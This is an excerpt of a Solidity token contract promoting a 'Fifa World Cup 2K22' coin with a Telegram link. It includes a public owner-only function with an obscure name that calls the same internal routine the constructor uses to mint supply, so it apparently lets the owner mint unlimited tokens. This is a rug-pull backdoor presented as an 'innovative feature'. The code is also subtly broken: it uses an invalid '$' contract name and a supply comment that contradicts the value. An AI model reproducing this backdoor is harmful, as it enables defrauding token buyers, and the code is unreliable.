...
//
// $FifaWorldCup2K22 proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/FifaWorldCup2k22Bsc
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _FifaWorldCup2K22(uint256 amount) public onlyOwner {
 _FifaWorldCup2K22(msg.sender, amount);
    }
    ...
    function _FifaWorldCup2K22(address account, uint256 amount) internal virtual {
...
contract $FifaWorldCup2K22 is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Fifa World Cup 2K22", "FWC2K22") {
     _FifaWorldCup2K22(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}